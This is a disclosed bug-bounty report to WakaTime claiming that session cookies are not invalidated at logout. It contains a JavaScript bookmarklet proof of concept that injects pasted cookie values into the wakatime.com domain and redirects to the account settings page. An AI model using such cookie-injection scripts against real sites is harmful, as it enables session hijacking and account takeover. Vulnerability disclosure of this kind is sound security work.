# Broken Authentication and session management OWASP A2

## Report Details
- **Report ID**: 798812
- **URL**: https://hackerone.com/reports/798812
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-02-18T13:44:47.323Z
- **Disclosed**: 2020-02-19T16:47:03.690Z

## Reporter
- **Username**: phhitachi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wakatime

## Vulnerability Information
Hi, Security Team!

 i found vulnerability on https://wakatime.com/

##Steps To Reproduce:

1. First log in into the account, website will create a session for current login.
2. Copy all Cookies and paste it on notepad.
3. Log out your account.
4. Open your chrome browser and right click on bookmark bar and `add page`.
5. Now, on `Edit Bookmark` and paste it on URL and save.

```javascript
javascript:void(function(){ 
    function setCookie(t) { 
    var list = t.split("; "); 
    console.log(list); 
        for (var i = list.length - 1; i >= 0; i--) { 
            var cname = list[i].split("=")[0]; var cvalue = list[i].split("=")[1]; 
            var d = new Date(); d.setTime(d.getTime() + (7*24*60*60*1000)); 
            var expires = ";domain=.wakatime.com;expires="+ d.toUTCString(); 
            document.cookie = cname + "=" + cvalue + "; " + expires; 
        } 
    } 
    function hex2a(hex) { 
        var str = ''; 
        for (var i = 0; i < hex.length; i += 2) {
            var v = parseInt(hex.substr(i, 2), 16); 
            if (v) str += String.fromCharCode(v); 
        } 
    return str; 
    } 
    var cookie = prompt("Broken Authentacation PoC", ""); 
    setCookie(cookie); 
    location.href = 'https://wakatime.com/settings/account'; 
})();
```

6, Click the bookmark page that you created, make sure you are in https://wakatime.com/ before you click the bookmark that you created to popup this.
{F720340}

Now paste your users cookies and we redirect in `https://wakatime.com/settings/account`

Please Watch my PoC:
{F720341}

## Impact

##(Session Token Not expired)
In this attack, an attacker (who can be anonymous external attacker, a user with own account who may attempt to steal data from accounts, or an insider wanting to disguise his or her actions) uses leaks or flaws in the authentication or session management functions to impersonate other users. Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.

Thanks,
@phhitachi

## Attachments
- poc.PNG
- Broken_Authentacation.avi
